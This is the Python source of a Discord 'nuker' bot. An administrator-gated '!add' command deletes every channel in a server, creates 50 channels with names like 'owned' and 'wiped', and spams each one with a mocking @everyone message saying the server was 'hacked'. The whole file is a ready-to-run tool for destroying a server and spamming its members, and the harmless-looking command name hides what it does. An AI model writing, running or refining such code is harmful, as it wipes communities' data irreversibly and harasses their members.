import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.command(name='add')
@commands.has_permissions(administrator=True)
async def add(ctx):
    guild = ctx.guild

    # PHASE 1: Delete ALL existing channels simultaneously
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    roast_message = "Hi, you have been hacked... just kidding! We just wiped your horrible server for you to start alllllllllllllllllllllllll over again. Thank me later for saving u so much time. @everyone"
    
    # Exactly 5 unique names repeated 10 times = 50 items total
    base_names = ["owned", "destroyed", "void", "wiped", "cleared"]
    channel_names_pool = base_names * 10 

    # PHASE 2: Request ALL 50 channels simultaneously
    create_tasks = [guild.create_text_channel(name=channel_names_pool[i]) for i in range(50)]
    results = await asyncio.gather(*create_tasks, return_exceptions=True)
    
    # Filter out any errors to get successful channels
    all_created_channels = [res for res in results if isinstance(res, discord.TextChannel)]

    # PHASE 3: Send messages concurrently to all created channels
    for new_channel in all_created_channels:
        try:
            async def send_spam(target_channel):
                for j in range(10):
                    try:
                        await target_channel.send(roast_message)
                        await asyncio.sleep(0.3)  # Aggressive message delay
                    except:
                        pass
            
            bot.loop.create_task(send_spam(new_channel))
        except:
            pass

# Bot run block sits outside the main event/command function
bot.run('UR BOT TOKEN')
